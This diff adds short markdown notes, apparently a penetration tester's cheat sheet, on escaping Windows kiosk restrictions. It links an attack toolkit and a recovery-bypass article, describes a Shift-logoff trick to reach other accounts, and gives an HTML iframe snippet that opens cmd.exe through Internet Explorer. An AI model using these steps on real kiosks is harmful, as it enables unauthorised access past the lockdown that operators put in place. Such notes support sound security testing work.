@@ -1,0 +1,13 @@
+# kiosk
+
+ikat (http://ikat.ha.cked.net/)
+http://www.anotherwayin.net/2015/07/windows-7-error-recovery-authentication.html
+
+# logoff & login as administrator
+if administrator account is not disable, just logoff holding the Shift key,
+then the logon screen will show the other accounts.
+
+# create below .html file and open it with IE to launch cmd.exe
+<html>
+<iframe src="file:///c:/windows/system32/cmd.exe" ></iframe>
+</html>
